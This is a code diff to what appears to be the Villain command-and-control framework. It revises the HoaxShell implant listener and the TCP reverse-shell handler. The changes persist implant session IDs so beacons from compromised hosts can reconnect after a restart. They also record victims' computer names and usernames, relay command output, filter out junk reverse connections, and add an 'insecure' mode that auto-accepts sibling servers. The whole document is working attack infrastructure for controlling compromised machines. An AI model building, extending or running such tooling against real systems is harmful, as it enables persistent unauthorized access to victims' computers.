@@ -12,7 +12,8 @@ from warnings import filterwarnings
 from datetime import date, datetime
 from ast import literal_eval
 from .common import *
-from .settings import * 
+from .settings import *
+from .logging import * 
 
 filterwarnings("ignore", category = DeprecationWarning)
 
@@ -82,9 +83,9 @@ class Payload_Generator:
 	def compute_hoaxshell(self, payload, user_args):
 
 		# Create session unique id if type == HoaxShell
-		verify = str(uuid4())[0:6]
-		get_cmd = str(uuid4())[0:6]
-		post_res = str(uuid4())[0:6]
+		verify = uuid4().hex[0:6]
+		get_cmd = uuid4().hex[0:6]
+		post_res = uuid4().hex[0:6]
 		header_id = 'Authorization' if not Hoaxshell_Settings._header else Hoaxshell_Settings._header
 		session_unique_id = '-'.join([verify, get_cmd, post_res])
 		exec_outfile = True if payload.meta['type'] in self.exec_outfile_support else False
@@ -99,6 +100,9 @@ class Payload_Generator:
 			'Shell' : payload.meta['shell'],
 			'iface' : payload.parameters['lhost']
 		}
+
+		# Store legit session metadata (used to restore previously established sessions)
+		HoaxShell_Implants_Logger.store_session_details(session_unique_id, Sessions_Manager.legit_session_ids[session_unique_id])
 
 		# Set lhost port
 		lhost = f"{payload.parameters['lhost']}:{Hoaxshell_Settings.bind_port}" if not Hoaxshell_Settings.ssl_support \
@@ -561,6 +565,29 @@ class Sessions_Manager:
 	sessions_graveyard = []
 	aliases = []
 
+	# Hoaxshell
+	verify = []
+	get_cmd = []
+	post_res = []
+
+	# Load past generated legit session payload details (if beacon is still alive they may be re-establish)
+	past_generated_sessions = HoaxShell_Implants_Logger.retrieve_past_sessions_data()
+
+	if past_generated_sessions:
+
+		sessions_data = literal_eval(past_generated_sessions)
+
+		for id in sessions_data.keys():
+			
+			legit_session_ids[id] = sessions_data[id]
+			h = id.split('-')
+			verify.append(h[0])
+			get_cmd.append(h[1])
+			post_res.append(h[2])
+
+		del sessions_data
+	del past_generated_sessions
+
 
 	def repair(self, session_id, key, new_val):
 
@@ -726,22 +753,22 @@ class Sessions_Manager:
 				if self.active_sessions[session_id]['Listener'] == 'hoaxshell':
 					sleep(self.active_sessions[session_id]['frequency'])
 					session_id_components = session_id.split('-')
-					Hoaxshell.verify.remove(session_id_components[0])
-					Hoaxshell.get_cmd.remove(session_id_components[1])
-					Hoaxshell.post_res.remove(session_id_components[2])
+					Sessions_Manager.verify.remove(session_id_components[0])
+					Sessions_Manager.get_cmd.remove(session_id_components[1])
+					Sessions_Manager.post_res.remove(session_id_components[2])
 
 				self.active_sessions.pop(session_id, None)
-				self.legit_session_ids.pop(session_id, None)
+				#self.legit_session_ids.pop(session_id, None) 
 				del Hoaxshell.command_pool[session_id]
 
 				print(f'[{INFO}] Session terminated.')
 				Core_Server.announce_session_termination({'session_id' : session_id})
 
 			else:
-				print(f'[{ERR}] Permission denied (session owned by sibling).')
+				print(f'[{ERR}] Permission denied. This session is owned by a sibling server).')
 
 		else:
-			print('Session invalid.')
+			print('Session id not found in active sessions.')
 
 
 
@@ -752,9 +779,6 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	header_id = Hoaxshell_Settings._header
 	server_unique_id = None
 	command_pool = {}
-	verify = []
-	get_cmd = []
-	post_res = []
 
 	# Shell
 	active_shell = None
@@ -1037,11 +1061,12 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 
 		if session_id and (session_id not in Sessions_Manager.active_sessions.keys()):
+
 			if session_id in Sessions_Manager.legit_session_ids.keys():
 				h = session_id.split('-')
-				Hoaxshell.verify.append(h[0])
-				Hoaxshell.get_cmd.append(h[1])
-				Hoaxshell.post_res.append(h[2])
+				Sessions_Manager.verify.append(h[0])
+				Sessions_Manager.get_cmd.append(h[1])
+				Sessions_Manager.post_res.append(h[2])
 
 				Sessions_Manager.active_sessions[session_id] = {
 					'IP Address' : self.client_address[0],
@@ -1078,8 +1103,13 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 
 		# Verify execution
+		# url_split = self.path.strip("/").split("/")
+		# if url_split[0] in Hoaxshell.verify and legit:
+
 		url_split = self.path.strip("/").split("/")
-		if url_split[0] in Hoaxshell.verify and legit:
+
+		if (url_split[0] in Sessions_Manager.verify and legit) or \
+		(legit and session_id in Sessions_Manager.active_sessions and not Sessions_Manager.active_sessions[session_id]['execution_verified']):
 
 			if Sessions_Manager.active_sessions[session_id]['execution_verified']:
 				print_to_prompt(f'\r[{INFO}] Received "Verify execution" request from an already established session (ignored).')
@@ -1095,6 +1125,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 			try:
 				Sessions_Manager.active_sessions[session_id]['Computername'] = url_split[1]
 				Sessions_Manager.active_sessions[session_id]['Username'] = url_split[2]
+
 			except IndexError:
 				Sessions_Manager.active_sessions[session_id]['Computername'] = 'Undefined'
 				Sessions_Manager.active_sessions[session_id]['Username'] = 'Undefined'
@@ -1116,7 +1147,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 
 		# Grab cmd
-		elif self.path.strip("/") in Hoaxshell.get_cmd and legit:
+		elif self.path.strip("/") in Sessions_Manager.get_cmd and legit:
 
 			self.send_response(200)
 			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
@@ -1163,47 +1194,58 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		if legit:
 
-			Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp
-			self.server_version = Hoaxshell_Settings.server_version
-			self.sys_version = ""
+			try:
+				Sessions_Manager.active_sessions[session_id]['last_received'] = timestamp
+				self.server_version = Hoaxshell_Settings.server_version
+				self.sys_version = ""
 
-			# cmd output
-			if self.path.strip("/") in self.post_res and legit:
+				# cmd output
+				if self.path.strip("/") in Sessions_Manager.post_res and legit and\
+				session_id in Sessions_Manager.active_sessions.keys():
 
-				try:
-					self.send_response(200)
-					self.send_header('Content-Type', 'text/plain')
-					self.end_headers()
-					self.wfile.write(b'OK')
-					content_len = int(self.headers.get('Content-Length'))
-					output = self.rfile.read(content_len)
-					output = self.cmd_output_interpreter(session_id, output, constraint_mode = Sessions_Manager.legit_session_ids[session_id]['constraint_mode'])
+					try:
+						self.send_response(200)
+						self.send_header('Content-Type', 'text/plain')
+						self.end_headers()
+						self.wfile.write(b'OK')
+						content_len = int(self.headers.get('Content-Length'))
+						output = self.rfile.read(content_len)
+						output = self.cmd_output_interpreter(session_id, output, constraint_mode = Sessions_Manager.legit_session_ids[session_id]['constraint_mode'])
 
-					if not isinstance(output, int):
+						if not isinstance(output, int):
+
+							if isinstance(output, str):
+								# Dirty patch to suppress error messages when re-establishing sessions (may occur due to bad synchronization).
+								if re.search("The term 'OK' is not recognized as the name of a cmdlet, function, script file", output):
+									return
+
+								print(f'\r{GREEN}{output}{END}') if output else chill()
+								Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
+
+							elif isinstance(output, list):
+								if not isinstance(output[1], int):
+									try: 
+										Core_Server.send_receive_one_encrypted(output[0], [f'{GREEN}{output[1]}{END}', None, session_id, True], 'command_output', 30)
+									except: 
+										pass
+
+					except ConnectionResetError:
+
+						error_msg = f'[{ERR}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try limiting the command\'s output.'
 
 						if isinstance(output, str):
-							print(f'\r{GREEN}{output}{END}') if output else chill()
+							print(error_msg)
 							Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
 
 						elif isinstance(output, list):
-							if not isinstance(output[1], int):
-								try: Core_Server.send_receive_one_encrypted(output[0], [f'{GREEN}{output[1]}{END}', None, session_id, True], 'command_output', 30)
-								except: pass
+							try: Core_Server.send_receive_one_encrypted(output[0], [error_msg, None, session_id, True], 'command_output', 30)
+							except: pass
 
-				except ConnectionResetError:
+						del error_msg
+					del output
 
-					error_msg = f'[{ERR}] There was an error reading the response, most likely because of the size (Content-Length: {self.headers.get("Content-Length")}). Try limiting the command\'s output.'
-
-					if isinstance(output, str):
-						print(error_msg)
-						Main_prompt.set_main_prompt_ready() if not self.active_shell else Hoaxshell.set_shell_prompt_ready()
-
-					elif isinstance(output, list):
-						try: Core_Server.send_receive_one_encrypted(output[0], [error_msg, None, session_id, True], 'command_output', 30)
-						except: pass
-
-					del error_msg
-				del output
+			except KeyError:
+				pass
 
 
 		else:
@@ -1288,35 +1330,38 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 		Threading_params.thread_limiter.acquire()
 
-		while session_id in Sessions_Manager.active_sessions.keys():
+		while True:
 
-			if session_id in Sessions_Manager.sessions_graveyard:
-				break
+			if session_id in Sessions_Manager.active_sessions.keys():
 
-			timestamp = int(datetime.now().timestamp())
-			tlimit = (Sessions_Manager.active_sessions[session_id]['frequency'] + Sessions_manager_settings.shell_state_change_after)
-			last_received = Sessions_Manager.active_sessions[session_id]['last_received']
-			time_difference = abs(last_received - timestamp)
-			current_status = Sessions_Manager.active_sessions[session_id]['Status']
+				if session_id in Sessions_Manager.sessions_graveyard and \
+				session_id not in Sessions_Manager.active_sessions.keys():
+					break
 
-			if (time_difference >= tlimit) and current_status == 'Active':
-				Sessions_Manager.active_sessions[session_id]['Status'] = 'Undefined'
-				Core_Server.announce_shell_session_stat_update({
-					'session_id' : session_id, 
-					'Status' : Sessions_Manager.active_sessions[session_id]['Status']
-				})
+				timestamp = int(datetime.now().timestamp())
+				tlimit = (Sessions_Manager.active_sessions[session_id]['frequency'] + Sessions_manager_settings.shell_state_change_after)
+				last_received = Sessions_Manager.active_sessions[session_id]['last_received']
+				time_difference = abs(last_received - timestamp)
+				current_status = Sessions_Manager.active_sessions[session_id]['Status']
 
-			elif (time_difference < tlimit) and current_status == 'Undefined':
-				Sessions_Manager.active_sessions[session_id]['Status'] = 'Active'
-				Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 
-					'Status' : Sessions_Manager.active_sessions[session_id]['Status']
-				})
+				if (time_difference >= tlimit) and current_status == 'Active':
+					Sessions_Manager.active_sessions[session_id]['Status'] = 'Undefined'
+					Core_Server.announce_shell_session_stat_update({
+						'session_id' : session_id, 
+						'Status' : Sessions_Manager.active_sessions[session_id]['Status']
+					})
 
-			sleep(Hoaxshell_Settings.monitor_shell_state_freq)
+				elif (time_difference < tlimit) and current_status == 'Undefined':
+					Sessions_Manager.active_sessions[session_id]['Status'] = 'Active'
+					Core_Server.announce_shell_session_stat_update({'session_id' : session_id, 
+						'Status' : Sessions_Manager.active_sessions[session_id]['Status']
+					})
 
-		else:
-			Threading_params.thread_limiter.release()
-			return
+				sleep(Hoaxshell_Settings.monitor_shell_state_freq)
+
+			else:
+				Threading_params.thread_limiter.release()
+				return
 
 
 
@@ -1398,7 +1443,7 @@ class Core_Server:
 			rst_prompt = False
 
 			# There are 3 predefined byte sequences for processing a sibling server's request 
-			# to connect (something like a TCP handshake but significantly more stupid)
+			# to connect (something like a TCP handshake but significantly more stupid).
 
 			# Check if raw_data is a connection request
 			if raw_data in [self.CONNECT_SYN, self.CONNECT_DENY]:
@@ -1413,25 +1458,32 @@ class Core_Server:
 
 					request_id = ''.join(["{}".format(randint(0, 9)) for num in range(0, 4)])
 					self.requests[request_id] = False
-					print(f"\r[{INFO}] Received request to connect from {ORANGE}{address[0]}{END}")
-					print_to_prompt(f"\r[{INFO}] Type {ORANGE}{request_id}{END} and press ENTER to accept. You have 10 seconds.")
-					timeout_start = time()
 
-					while time() < timeout_start + 10:
-
-						if self.requests[request_id]:
-							self.acknowledged_servers.append(address[0])
-							Core_Server.send_msg(conn, self.CONNECT_ACK)
-							break
-						sleep(0.1)
+					if Core_Server_Settings.insecure:
+						self.acknowledged_servers.append(address[0])
+						Core_Server.send_msg(conn, self.CONNECT_ACK)						
 
 					else:
 
-						Core_Server.send_msg(conn, self.CONNECT_DENY)
-						conn.close()
-						print_to_prompt(f"\r[{INFO}] Request to connect with {ORANGE}{address[0]}{END} denied.")
+						print(f"\r[{INFO}] Received request to connect from {ORANGE}{address[0]}{END}")
+						print_to_prompt(f"\r[{INFO}] Type {ORANGE}{request_id}{END} and press ENTER to accept. You have 10 seconds.")
+						timeout_start = time()
 
-					del self.requests[request_id]
+						while time() < timeout_start + 10:
+
+							if self.requests[request_id]:
+								self.acknowledged_servers.append(address[0])
+								Core_Server.send_msg(conn, self.CONNECT_ACK)
+								break
+							sleep(0.1)
+
+						else:
+
+							Core_Server.send_msg(conn, self.CONNECT_DENY)
+							conn.close()
+							print_to_prompt(f"\r[{INFO}] Request to connect with {ORANGE}{address[0]}{END} denied.")
+
+						del self.requests[request_id]
 
 				return
 
@@ -2292,7 +2344,7 @@ class TCP_Sock_Multi_Handler:
 			timestamp = int(datetime.now().timestamp())
 
 			# Create session unique id
-			session_id = f'{str(uuid4())[0:6]}-{str(uuid4())[0:6]}-{str(uuid4())[0:6]}'
+			session_id = f'{uuid4().hex[0:6]}-{uuid4().hex[0:6]}-{uuid4().hex[0:6]}'
 
 			# Identify the OS, Hostname and User
 			win_cmd = False
@@ -2405,7 +2457,7 @@ class TCP_Sock_Multi_Handler:
 
 				except:
 					hostname_undefined = True
-					hostname = 'UNDEFINED'
+					hostname = 'Undefined'
 
 			else:
 				tmp = username.split('\\')
@@ -2420,6 +2472,19 @@ class TCP_Sock_Multi_Handler:
 						username = tmp[1]
 				else:
 					username = tmp[1]
+
+			# Check if connection is a random socket by assessing the hostname value received.
+			# This filter protects against junk sessions.
+			if TCP_Sock_Handler_Settings.hostname_filter:
+				if not self.validate_hostname(hostname) or hostname == 'Undefined':
+					conn.close()
+
+					if not TCP_Sock_Handler_Settings.hostname_filter_warning_delivered:
+						print_to_prompt(f'\r[{WARN}] A TCP reverse connection was rejected due to hostname validation failure. You can disable this filter by setting hostname_filter to False in Villain/Core/settings.py. This warning will be muted for the rest of the session.')
+						TCP_Sock_Handler_Settings.hostname_filter_warning_delivered = True
+
+					Threading_params.thread_limiter.release()
+					return				
 
 			# Detect shell prompt and set it as sentinel value
 			prompt = False
@@ -2547,7 +2612,8 @@ class TCP_Sock_Multi_Handler:
 
 						conn.sendall('{}\n'.format(cmd).encode('utf-8'))
 
-						if session_id in Sessions_Manager.sessions_graveyard:
+						if session_id in Sessions_Manager.sessions_graveyard and \
+						session_id not in Sessions_Manager.active_sessions.keys():
 							break
 						
 						# Read response
@@ -2632,7 +2698,7 @@ class TCP_Sock_Multi_Handler:
 					if shell_type: #and prompt:
 
 						if prompt:
-							# The following func searches for sentinel value in the chunk. If detected,
+							# The following func searches for a sentinel value in the chunk. If detected,
 							# it seperates the last chunk's data and the prompt value and returns:
 							# [True, [chunk, prompt_value], shell_type] else it returns [False]							
 							sentinel_value = self.search_chunk_for_sentinel_value(shell_type, chunk)
@@ -2702,6 +2768,30 @@ class TCP_Sock_Multi_Handler:
 			Main_prompt.set_main_prompt_ready() if not Hoaxshell.active_shell else Hoaxshell.set_shell_prompt_ready()
 
 		return self.clean_nc_response(response) if shell_type else response
+
+
+
+	# def validate_hostname(self, hostname):
+
+	# 	try:
+	# 		if re.match(r"^(([a-zA-Z0-9]|[a-z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])$", hostname):
+	# 			return True
+	# 		else:
+	# 			return False
+	# 	except:
+	# 		return False
+
+
+	def validate_hostname(self, hostname):
+
+		if len(hostname) > 255:
+			return False
+		
+		if hostname[-1] == ".":
+			hostname = hostname[:-1]
+
+		allowed = re.compile("(?!-)[A-Z\d-]{1,63}(?<!-)$", re.IGNORECASE)
+		return all(allowed.match(x) for x in hostname.split("."))
 
 
 
